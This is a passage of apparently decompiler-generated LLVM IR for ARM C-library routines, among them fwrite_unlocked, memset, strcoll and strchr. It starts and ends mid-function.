  uselistorder i32 %v3_155c0, { 1, 0 }
  uselistorder i32 %v1_15580, { 1, 2, 0 }
  uselistorder i32 %v0_15534, { 1, 2, 0 }
  uselistorder i32 %v2_15510, { 1, 0 }
  uselistorder i32 %v1_15510, { 1, 0, 2 }
  uselistorder i32 %v0_15530, { 3, 4, 5, 0, 7, 6, 9, 1, 2, 8, 10 }
  uselistorder i32 %v1_15474, { 1, 2, 0 }
  uselistorder i32 %v3_1545c, { 1, 0 }
  uselistorder i32 %v3_15454, { 1, 0 }
  uselistorder i32 %v2_15434, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1541c, { 0, 2, 3, 1 }
  uselistorder i32 %v1_15400, { 1, 0, 2 }
  uselistorder i32 %v3_153e0, { 2, 1, 0 }
  uselistorder i32 %v1_153a4, { 0, 2, 3, 1 }
  uselistorder i32 %v2_15378, { 1, 0 }
  uselistorder i32 %v5_152d8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_152d8, { 1, 0 }
  uselistorder i32 %storemerge105, { 1, 0, 4, 5, 2, 3 }
  uselistorder i32 %stack_var_-48.2, { 1, 0 }
  uselistorder i32 %v2_15284, { 1, 0 }
  uselistorder i32 %v0_152a0, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_15268, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_15250, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i32 %v3_1523c, { 1, 2, 0 }
  uselistorder i32 %v0_152b4, { 1, 2, 3, 0, 4, 7, 5, 6 }
  uselistorder i32 %stack_var_-48.1, { 1, 2, 3, 0 }
  uselistorder i32 %v0_151f0, { 1, 0 }
  uselistorder i32 %v1_151c0, { 0, 2, 1 }
  uselistorder i32 %v25_1514c, { 0, 8, 1, 9, 2, 7, 3, 10, 4, 5, 6 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %stack_var_-36, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %sb.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3, 8, 9 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 1, 3, 4, 7, 6, 5, 8 }
  uselistorder i32* %r7.global-to-local, { 4, 2, 1, 5, 9, 6, 0, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 3, 18 }
  uselistorder i32* %r6.global-to-local, { 14, 11, 12, 9, 3, 5, 13, 6, 7, 8, 0, 1, 2, 15, 4, 10 }
  uselistorder i32* %r3.global-to-local, { 3, 0, 11, 4, 5, 6, 7, 8, 9, 10, 12, 13, 14, 15, 17, 16, 1, 2, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 41, 42, 43, 39, 40, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 14, 15, 11, 12, 0, 16 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 5, 7, 6, 8, 9, 10, 11, 12, 13, 20, 19, 14, 22, 15, 16, 17, 23, 18, 24, 25, 1, 26, 27, 28, 21, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 8, 7 }
  uselistorder i32 38, { 2, 0, 1 }
  uselistorder i32 ()* @_promoted_size, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1f660.932 to i32), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_1f670.930 to i32), { 1, 0, 2 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_1f68c.924 to i32), { 2, 1, 3, 0, 4 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_1f64c.922 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 2, 3, 4, 1, 5, 0, 6, 7 }
  uselistorder label %dec_label_pc_155e4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_155e0, { 6, 7, 8, 2, 4, 3, 1, 5, 0 }
  uselistorder label %bb146, { 1, 0 }
  uselistorder label %dec_label_pc_155ac, { 1, 0 }
  uselistorder label %dec_label_pc_1557c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15568, { 0, 2, 1 }
  uselistorder label %dec_label_pc_15524, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_154dc, { 1, 0 }
  uselistorder label %bb137, { 2, 1, 0 }
  uselistorder label %.thread25, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15390, { 1, 0 }
  uselistorder label %dec_label_pc_15368, { 1, 0 }
  uselistorder label %dec_label_pc_15318, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_15298, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15294, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_151f4, { 1, 0 }
  uselistorder label %dec_label_pc_151e4, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_15610 = load i32, i32* @r4, align 4
  store i32 %v3_15610, i32* %stack_var_-16, align 4
  %v6_15610 = load i32, i32* @r5, align 4
  %v9_15610 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_1561c = call i32 @strlen(i8* %arg1)
  store i32 %v3_1561c, i32* @r6, align 4
  %v0_15624 = load i32, i32* @r5, align 4
  %v0_15628 = load i32, i32* @r4, align 4
  %v5_15634 = inttoptr i32 %v0_15624 to i8*
  %v6_15634 = call i32 @__GI_fwrite_unlocked(i32 %v0_15628, i32 1, i32 %v3_1561c, i8* %v5_15634)
  %v1_15638 = load i32, i32* @r6, align 4
  %v9_15638 = icmp eq i32 %v6_15634, %v1_15638
  br i1 %v9_15638, label %bb7, label %bb

bb:                                               ; preds = %entry
  br label %bb7

bb7:                                              ; preds = %entry, %bb
  %v14_15640 = phi i32 [ %v6_15634, %entry ], [ -1, %bb ]
  %v2_15640 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15640, i32* @r4, align 4
  store i32 %v6_15610, i32* @r5, align 4
  store i32 %v9_15610, i32* @r6, align 4
  ret i32 %v14_15640

; uselistorder directives
  uselistorder label %bb7, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v9_15644 = load i32, i32* @r6, align 4
  %v12_15644 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_1564c = load i8, i8* %arg4, align 1
  %v4_1564c = zext i8 %v3_1564c to i32
  %v1_15650 = and i32 %v4_1564c, 192
  store i32 %v1_15650, i32* %r3.global-to-local, align 4
  %v2_15654 = icmp eq i32 %v1_15650, 192
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg3, i32* @r6, align 4
  br i1 %v2_15654, label %dec_label_pc_1567c, label %dec_label_pc_15670

dec_label_pc_15670:                               ; preds = %entry
  %v4_15670 = call i32 @__stdio_trans2w_o(i8* nonnull %arg4, i32 128)
  %v2_15674 = icmp eq i32 %v4_15670, 0
  br i1 %v2_15674, label %dec_label_pc_15670.dec_label_pc_1567c_crit_edge, label %dec_label_pc_156e4

dec_label_pc_15670.dec_label_pc_1567c_crit_edge:  ; preds = %dec_label_pc_15670
  %v0_1567c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1567c

dec_label_pc_1567c:                               ; preds = %dec_label_pc_15670.dec_label_pc_1567c_crit_edge, %entry
  %v0_156841 = phi i32 [ %v0_1567c.pre, %dec_label_pc_15670.dec_label_pc_1567c_crit_edge ], [ %arg2, %entry ]
  %v2_1567c = icmp eq i32 %v0_156841, 0
  br i1 %v2_1567c, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_1567c
  br label %dec_label_pc_156e4

bb:                                               ; preds = %dec_label_pc_1567c
  %v1_15680 = load i32, i32* @r6, align 4
  %v3_15680 = icmp eq i32 %v1_15680, 0
  br i1 %v3_15680, label %dec_label_pc_156e4, label %dec_label_pc_15690

dec_label_pc_15690:                               ; preds = %bb
  %v2_15690 = udiv i32 -1, %v0_156841
  %v0_15698 = load i32, i32* @r4, align 4
  store i32 %v0_15698, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ugt i32 %v1_15680, %v2_15690
  br i1 %tmp10, label %dec_label_pc_156bc, label %dec_label_pc_156a4

dec_label_pc_156a4:                               ; preds = %dec_label_pc_15690
  %v0_1569c = load i32, i32* @r7, align 4
  %v2_156a4 = mul i32 %v1_15680, %v0_156841
  %v4_156a8 = call i32 @__stdio_fwrite(i32 %v0_1569c, i32 %v2_156a4, i32 %v0_15698)
  %v0_156ac = load i32, i32* @r5, align 4
  %v2_156b0 = udiv i32 %v4_156a8, %v0_156ac
  store i32 %v2_156b0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_156e8

dec_label_pc_156bc:                               ; preds = %dec_label_pc_15690
  %v1_156bc = inttoptr i32 %v0_15698 to i32*
  %v2_156bc = load i32, i32* %v1_156bc, align 4
  %v1_156c0 = or i32 %v2_156bc, 8
  store i32 %v1_156c0, i32* %r3.global-to-local, align 4
  %v3_156c4 = sdiv i32 %v2_156bc, 256
  store i32 %v3_156c4, i32* %r2.global-to-local, align 4
  %v1_156c8 = trunc i32 %v3_156c4 to i8
  %v3_156c8 = add i32 %v0_15698, 1
  %v4_156c8 = inttoptr i32 %v3_156c8 to i8*
  store i8 %v1_156c8, i8* %v4_156c8, align 1
  %v0_156cc = load i32, i32* %r3.global-to-local, align 4
  %v1_156cc = trunc i32 %v0_156cc to i8
  %v2_156cc = load i32, i32* @r4, align 4
  %v3_156cc = inttoptr i32 %v2_156cc to i8*
  store i8 %v1_156cc, i8* %v3_156cc, align 1
  %v0_156d0 = call i32 @__errno_location()
  store i32 22, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_156dc = inttoptr i32 %v0_156d0 to i32*
  store i32 22, i32* %v2_156dc, align 4
  %v0_156e8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_156e8

dec_label_pc_156e4:                               ; preds = %.thread, %dec_label_pc_15670, %bb
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_156e8

dec_label_pc_156e8:                               ; preds = %dec_label_pc_156bc, %dec_label_pc_156a4, %dec_label_pc_156e4
  %v0_156e8 = phi i32 [ %v0_156e8.pre, %dec_label_pc_156bc ], [ %v2_156b0, %dec_label_pc_156a4 ], [ 0, %dec_label_pc_156e4 ]
  store i32 %v9_15644, i32* @r6, align 4
  store i32 %v12_15644, i32* @r7, align 4
  ret i32 %v0_156e8

; uselistorder directives
  uselistorder i32 %v3_156c4, { 1, 0 }
  uselistorder i32 %v1_15680, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 (i32, i32, i32)* @__stdio_fwrite, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_156e8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_156e4, { 2, 0, 1 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_156fc = inttoptr i32 %arg2 to i8*
  %v3_156fc = call i32 @_memcpy(i8* %v2_156fc, i32 %arg1)
  ret i32 %v3_156fc
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_15700 = load i32, i32* @r0, align 4
  %v1_15700 = load i32, i32* @r1, align 4
  %v2_15700 = inttoptr i32 %v0_15700 to i8*
  %v3_15700 = call i32 @_memcpy(i8* %v2_15700, i32 %v1_15700)
  ret i32 %v3_15700
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_15714 = load i32, i32* @r2, align 4
  %v8_15714 = icmp eq i32 %v0_15714, 8
  store i1 %v8_15714, i1* %cpsr_z.global-to-local, align 1
  %v5_15718 = icmp slt i32 %v0_15714, 8
  br i1 %v5_15718, label %dec_label_pc_15778, label %dec_label_pc_1571c

dec_label_pc_1571c:                               ; preds = %entry
  %v4_1571c = mul i32 %arg2, 256
  %v5_1571c = or i32 %v4_1571c, %arg2
  %v4_15720 = mul i32 %v5_1571c, 65536
  %v5_15720 = or i32 %v4_15720, %v5_1571c
  store i32 %v5_15720, i32* %r1.global-to-local, align 4
  %v1_1572457 = urem i32 %tmp, 4
  %v2_1572458 = icmp eq i32 %v1_1572457, 0
  store i1 %v2_1572458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_1572458, label %dec_label_pc_15734, label %bb

bb:                                               ; preds = %dec_label_pc_1571c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_1571c ]
  %v3_1572859 = phi i32 [ %v6_15728, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_1571c ]
  %v4_15728 = inttoptr i32 %v3_1572859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_15728, align 1
  %v5_15728 = load i32, i32* %r3.global-to-local, align 4
  %v6_15728 = add i32 %v5_15728, 1
  store i32 %v6_15728, i32* %r3.global-to-local, align 4
  %v0_1572c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_15738.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_1572c.pr, label %dec_label_pc_15734, label %.thread

.thread:                                          ; preds = %bb
  %v2_1572c = add i32 %v0_15738.pr.pre, -1
  store i32 %v2_1572c, i32* @r2, align 4
  %v1_15724 = urem i32 %v6_15728, 4
  %v2_15724 = icmp eq i32 %v1_15724, 0
  store i1 %v2_15724, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15724, label %dec_label_pc_15734, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_15728.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_15728.pre to i8
  br label %bb

dec_label_pc_15734:                               ; preds = %.thread, %bb, %dec_label_pc_1571c
  %v0_1574028 = phi i32 [ %tmp, %dec_label_pc_1571c ], [ %v6_15728, %bb ], [ %v6_15728, %.thread ]
  %v0_15738.pr = phi i32 [ %v0_15714, %dec_label_pc_1571c ], [ %v0_15738.pr.pre, %bb ], [ %v2_1572c, %.thread ]
  %v0_15734 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_15734, i32* @ip, align 4
  %v8_1573810 = icmp eq i32 %v0_15738.pr, 8
  store i1 %v8_1573810, i1* %cpsr_z.global-to-local, align 1
  %v5_1573c11 = icmp slt i32 %v0_15738.pr, 8
  br i1 %v5_1573c11, label %dec_label_pc_15778, label %dec_label_pc_15740.preheader

dec_label_pc_15740.preheader:                     ; preds = %dec_label_pc_15734
  %v1_1574046 = inttoptr i32 %v0_1574028 to i32*
  store i32 %v0_15734, i32* %v1_1574046, align 4
  %v3_1574047 = add i32 %v0_1574028, 4
  %v4_1574048 = inttoptr i32 %v3_1574047 to i32*
  %v5_1574049 = load i32, i32* @ip, align 4
  store i32 %v5_1574049, i32* %v4_1574048, align 4
  %v6_1574050 = add i32 %v0_1574028, 8
  store i32 %v6_1574050, i32* %r3.global-to-local, align 4
  %v0_1574451 = load i32, i32* @r2, align 4
  %v1_1574452 = add i32 %v0_1574451, -8
  store i32 %v1_1574452, i32* %r2.global-to-local, align 4
  %v5_1574c53 = icmp slt i32 %v1_1574452, 8
  br i1 %v5_1574c53, label %dec_label_pc_15740.dec_label_pc_15778.loopexit_crit_edge, label %dec_label_pc_15750

dec_label_pc_15750:                               ; preds = %dec_label_pc_15740.preheader, %dec_label_pc_15738.dec_label_pc_15740_crit_edge
  %v6_1574055 = phi i32 [ %v6_15740, %dec_label_pc_15738.dec_label_pc_15740_crit_edge ], [ %v6_1574050, %dec_label_pc_15740.preheader ]
  %v0_1574054 = phi i32 [ %v12_1576c, %dec_label_pc_15738.dec_label_pc_15740_crit_edge ], [ %v0_1574028, %dec_label_pc_15740.preheader ]
  %v1_15750 = inttoptr i32 %v6_1574055 to i32*
  %v2_15750 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_15750, i32* %v1_15750, align 4
  %v3_15750 = add i32 %v0_1574054, 12
  %v4_15750 = inttoptr i32 %v3_15750 to i32*
  %v5_15750 = load i32, i32* @ip, align 4
  store i32 %v5_15750, i32* %v4_15750, align 4
  %v6_15750 = add i32 %v0_1574054, 16
  store i32 %v6_15750, i32* %r3.global-to-local, align 4
  %v0_15754 = load i32, i32* %r2.global-to-local, align 4
  %v1_15754 = add i32 %v0_15754, -8
  store i32 %v1_15754, i32* %r2.global-to-local, align 4
  %v5_1575c = icmp slt i32 %v1_15754, 8
  br i1 %v5_1575c, label %dec_label_pc_15750.dec_label_pc_15778.loopexit_crit_edge, label %dec_label_pc_15760

dec_label_pc_15760:                               ; preds = %dec_label_pc_15750
  %v1_15760 = inttoptr i32 %v6_15750 to i32*
  %v2_15760 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_15760, i32* %v1_15760, align 4
  %v3_15760 = add i32 %v0_1574054, 20
  %v4_15760 = inttoptr i32 %v3_15760 to i32*
  %v5_15760 = load i32, i32* @ip, align 4
  store i32 %v5_15760, i32* %v4_15760, align 4
  %v6_15760 = add i32 %v0_1574054, 24
  store i32 %v6_15760, i32* %r3.global-to-local, align 4
  %v0_15764 = load i32, i32* %r2.global-to-local, align 4
  %v1_15764 = add i32 %v0_15764, -8
  store i32 %v1_15764, i32* %r2.global-to-local, align 4
  %v5_1576c = icmp slt i32 %v1_15764, 8
  br i1 %v5_1576c, label %dec_label_pc_15760.dec_label_pc_15778.loopexit_crit_edge, label %dec_label_pc_15738

dec_label_pc_15738:                               ; preds = %dec_label_pc_15760
  %v7_1576c = inttoptr i32 %v6_15760 to i32*
  %v8_1576c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_1576c, i32* %v7_1576c, align 4
  %v9_1576c = add i32 %v0_1574054, 28
  %v10_1576c = inttoptr i32 %v9_1576c to i32*
  %v11_1576c = load i32, i32* @ip, align 4
  store i32 %v11_1576c, i32* %v10_1576c, align 4
  %v12_1576c = add i32 %v0_1574054, 32
  store i32 %v12_1576c, i32* %r3.global-to-local, align 4
  %v6_15770 = load i32, i32* %r2.global-to-local, align 4
  %v7_15770 = add i32 %v6_15770, -8
  store i32 %v7_15770, i32* %r2.global-to-local, align 4
  %v5_1573c = icmp slt i32 %v7_15770, 8
  br i1 %v5_1573c, label %dec_label_pc_15738.dec_label_pc_15778.loopexit_crit_edge, label %dec_label_pc_15738.dec_label_pc_15740_crit_edge

dec_label_pc_15738.dec_label_pc_15740_crit_edge:  ; preds = %dec_label_pc_15738
  %v2_15740.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_15740 = inttoptr i32 %v12_1576c to i32*
  store i32 %v2_15740.pre, i32* %v1_15740, align 4
  %v3_15740 = add i32 %v0_1574054, 36
  %v4_15740 = inttoptr i32 %v3_15740 to i32*
  %v5_15740 = load i32, i32* @ip, align 4
  store i32 %v5_15740, i32* %v4_15740, align 4
  %v6_15740 = add i32 %v0_1574054, 40
  store i32 %v6_15740, i32* %r3.global-to-local, align 4
  %v0_15744 = load i32, i32* %r2.global-to-local, align 4
  %v1_15744 = add i32 %v0_15744, -8
  store i32 %v1_15744, i32* %r2.global-to-local, align 4
  %v5_1574c = icmp slt i32 %v1_15744, 8
  br i1 %v5_1574c, label %dec_label_pc_15740.dec_label_pc_15778.loopexit_crit_edge, label %dec_label_pc_15750

dec_label_pc_15740.dec_label_pc_15778.loopexit_crit_edge: ; preds = %dec_label_pc_15738.dec_label_pc_15740_crit_edge, %dec_label_pc_15740.preheader
  %v1_15744.lcssa = phi i32 [ %v1_1574452, %dec_label_pc_15740.preheader ], [ %v1_15744, %dec_label_pc_15738.dec_label_pc_15740_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15778

dec_label_pc_15738.dec_label_pc_15778.loopexit_crit_edge: ; preds = %dec_label_pc_15738
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15778

dec_label_pc_15750.dec_label_pc_15778.loopexit_crit_edge: ; preds = %dec_label_pc_15750
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15778

dec_label_pc_15760.dec_label_pc_15778.loopexit_crit_edge: ; preds = %dec_label_pc_15760
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15778

dec_label_pc_15778:                               ; preds = %dec_label_pc_15734, %dec_label_pc_15740.dec_label_pc_15778.loopexit_crit_edge, %dec_label_pc_15738.dec_label_pc_15778.loopexit_crit_edge, %dec_label_pc_15750.dec_label_pc_15778.loopexit_crit_edge, %dec_label_pc_15760.dec_label_pc_15778.loopexit_crit_edge, %entry
  %v0_15780 = phi i32 [ %v0_15714, %entry ], [ %v1_15764, %dec_label_pc_15760.dec_label_pc_15778.loopexit_crit_edge ], [ %v1_15754, %dec_label_pc_15750.dec_label_pc_15778.loopexit_crit_edge ], [ %v7_15770, %dec_label_pc_15738.dec_label_pc_15778.loopexit_crit_edge ], [ %v1_15744.lcssa, %dec_label_pc_15740.dec_label_pc_15778.loopexit_crit_edge ], [ %v0_15738.pr, %dec_label_pc_15734 ]
  %v2_15778 = icmp eq i32 %v0_15780, 0
  store i1 %v2_15778, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15778, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_15778
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_15778
  %v1_15780 = sub i32 7, %v0_15780
  store i32 %v1_15780, i32* %r2.global-to-local, align 4
  %v3_15784 = mul i32 %v1_15780, 4
  %v4_15784 = add i32 %v3_15784, ptrtoint (i32* @global_var_1578c.933 to i32)
  call void @__pseudo_branch(i32 %v4_15784)
  %v0_1578c = load i32, i32* %r1.global-to-local, align 4
  %v1_1578c = trunc i32 %v0_1578c to i8
  %v2_1578c = load i32, i32* %r3.global-to-local, align 4
  %v3_1578c = inttoptr i32 %v2_1578c to i8*
  store i8 %v1_1578c, i8* %v3_1578c, align 1
  %v4_1578c = load i32, i32* %r3.global-to-local, align 4
  %v5_1578c = add i32 %v4_1578c, 1
  store i32 %v5_1578c, i32* %r3.global-to-local, align 4
  %v0_15790 = load i32, i32* %r1.global-to-local, align 4
  %v1_15790 = trunc i32 %v0_15790 to i8
  %v3_15790 = inttoptr i32 %v5_1578c to i8*
  store i8 %v1_15790, i8* %v3_15790, align 1
  %v4_15790 = load i32, i32* %r3.global-to-local, align 4
  %v5_15790 = add i32 %v4_15790, 1
  store i32 %v5_15790, i32* %r3.global-to-local, align 4
  %v0_15794 = load i32, i32* %r1.global-to-local, align 4
  %v1_15794 = trunc i32 %v0_15794 to i8
  %v3_15794 = inttoptr i32 %v5_15790 to i8*
  store i8 %v1_15794, i8* %v3_15794, align 1
  %v4_15794 = load i32, i32* %r3.global-to-local, align 4
  %v5_15794 = add i32 %v4_15794, 1
  store i32 %v5_15794, i32* %r3.global-to-local, align 4
  %v0_15798 = load i32, i32* %r1.global-to-local, align 4
  %v1_15798 = trunc i32 %v0_15798 to i8
  %v3_15798 = inttoptr i32 %v5_15794 to i8*
  store i8 %v1_15798, i8* %v3_15798, align 1
  %v4_15798 = load i32, i32* %r3.global-to-local, align 4
  %v5_15798 = add i32 %v4_15798, 1
  store i32 %v5_15798, i32* %r3.global-to-local, align 4
  %v0_1579c = load i32, i32* %r1.global-to-local, align 4
  %v1_1579c = trunc i32 %v0_1579c to i8
  %v3_1579c = inttoptr i32 %v5_15798 to i8*
  store i8 %v1_1579c, i8* %v3_1579c, align 1
  %v4_1579c = load i32, i32* %r3.global-to-local, align 4
  %v5_1579c = add i32 %v4_1579c, 1
  store i32 %v5_1579c, i32* %r3.global-to-local, align 4
  %v0_157a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_157a0 = trunc i32 %v0_157a0 to i8
  %v3_157a0 = inttoptr i32 %v5_1579c to i8*
  store i8 %v1_157a0, i8* %v3_157a0, align 1
  %v4_157a0 = load i32, i32* %r3.global-to-local, align 4
  %v5_157a0 = add i32 %v4_157a0, 1
  store i32 %v5_157a0, i32* %r3.global-to-local, align 4
  %v0_157a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_157a4 = trunc i32 %v0_157a4 to i8
  %v3_157a4 = inttoptr i32 %v5_157a0 to i8*
  store i8 %v1_157a4, i8* %v3_157a4, align 1
  %v4_157a4 = load i32, i32* %r3.global-to-local, align 4
  %v5_157a4 = add i32 %v4_157a4, 1
  store i32 %v5_157a4, i32* %r3.global-to-local, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_15740, { 1, 0 }
  uselistorder i32 %v12_1576c, { 1, 2, 0 }
  uselistorder i32 %v0_1574054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_15738.pr, { 0, 2, 1 }
  uselistorder i32 %v6_15728, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_1571c, { 1, 0 }
  uselistorder i32 %v0_15714, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 20, 19, 17, 14, 15, 16, 13, 18, 21, 22 }
  uselistorder i32* %r2.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 5, 12, 3, 7, 13, 6, 1, 8, 9, 11, 10, 4, 14, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 2, 1, 3, 0, 5, 8, 7, 4, 9 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_15778, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_15750, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_157b4.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_157b4 = phi i32 [ %v0_157b4.pre, %bb ], [ %v5_157b4, %bb3 ]
  %v0_157b0 = phi i32 [ %tmp, %bb ], [ %v5_157b0, %bb3 ]
  %v1_157b0 = inttoptr i32 %v0_157b0 to i8*
  %v2_157b0 = load i8, i8* %v1_157b0, align 1
  %v3_157b0 = zext i8 %v2_157b0 to i32
  store i32 %v3_157b0, i32* @r2, align 4
  %v1_157b4 = inttoptr i32 %v0_157b4 to i8*
  %v2_157b4 = load i8, i8* %v1_157b4, align 1
  %v3_157b4 = zext i8 %v2_157b4 to i32
  %v2_157b8 = icmp eq i8 %v2_157b0, 0
  br i1 %v2_157b8, label %.dec_label_pc_157c4_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_157b4 = add i32 %v0_157b4, 1
  %v5_157b0 = add i32 %v0_157b0, 1
  %v10_157bc = icmp eq i8 %v2_157b0, %v2_157b4
  br i1 %v10_157bc, label %entry, label %dec_label_pc_157c4

.dec_label_pc_157c4_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_157c4

dec_label_pc_157c4:                               ; preds = %bb3, %.dec_label_pc_157c4_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_157c4_crit_edge ], [ %v3_157b0, %bb3 ]
  %v2_157c4.pre-phi = sub nsw i32 %.pn, %v3_157b4
  ret i32 %v2_157c4.pre-phi

; uselistorder directives
  uselistorder i32 %v0_157b0, { 1, 0 }
  uselistorder i32 %v0_157b4, { 1, 0 }
  uselistorder label %dec_label_pc_157c4, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v6_15830 = load i32, i32* @r5, align 4
  %v9_15830 = load i32, i32* @r6, align 4
  %v1_15834 = urem i32 %arg1, 256
  br label %dec_label_pc_15854

dec_label_pc_1583c:                               ; preds = %dec_label_pc_15854
  %v3_1583c = load i8, i8* %.0, align 1
  %v4_1583c = zext i8 %v3_1583c to i32
  %v9_15840 = icmp eq i32 %v4_1583c, %v1_15834
  br i1 %v9_15840, label %bb, label %bb24

bb:                                               ; preds = %dec_label_pc_1583c
